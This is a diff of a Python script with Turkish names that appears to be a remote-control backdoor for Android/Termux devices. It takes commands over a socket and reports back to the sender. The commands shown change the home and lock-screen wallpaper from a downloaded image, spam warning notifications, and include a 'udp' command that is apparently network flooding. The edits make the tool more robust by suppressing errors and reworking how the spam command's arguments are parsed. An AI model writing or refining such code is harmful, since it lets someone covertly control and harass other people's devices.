@@ -19,7 +19,10 @@ def arkaplan_degistir(resim_url):
     try:
         urllib.request.urlretrieve(resim_url, "duvar.jpg")
         os.system("termux-wallpaper -f duvar.jpg")
-        os.system("termux-wallpaper -t lock -f duvar.jpg")
+        try:
+            os.system("termux-wallpaper -t lock -f duvar.jpg")
+        except:
+            pass  # cihaz desteklemiyorsa hata verme
         s.send("[✓] Ana ve kilit ekrani degistirildi\n".encode())
     except:
         s.send("[!] Duvar kagidi degistirilemedi\n".encode())
@@ -82,9 +85,10 @@ while True:
             uyari_bildirimi(mesaj)
         elif komut.startswith("uyarispam "):
             try:
-                _, mesaj, flag, adet = komut.split(" ")
-                if flag == "-m":
-                    uyari_spam(mesaj, int(adet))
+                komut = komut.replace("uyarispam ", "")
+                if " -m " in komut:
+                    mesaj, miktar = komut.split(" -m ")
+                    uyari_spam(mesaj.strip(), int(miktar.strip()))
             except:
                 s.send("[!] Hata: uyarispam komutu\n".encode())
         elif komut.startswith("udp "):
